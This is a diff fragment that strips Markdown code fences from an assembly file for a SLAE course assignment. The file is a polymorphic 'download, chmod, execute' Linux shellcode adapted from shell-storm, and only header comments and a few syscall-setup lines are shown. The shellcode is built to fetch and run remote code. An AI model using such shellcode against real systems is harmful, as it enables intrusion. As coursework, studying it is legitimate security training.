@@ -1,4 +1,3 @@
-```nasm
 ; SLAE Assignment 6: Download Chmod Execute (morphed)
 ; http://shell-storm.org/shellcode/files/shellcode-862.php
 ; Original Shellcode Length:	108
@@ -60,4 +59,3 @@ download:
 	push ebx
 	mov ecx, esp		
 	int 0x80 			; download
-```
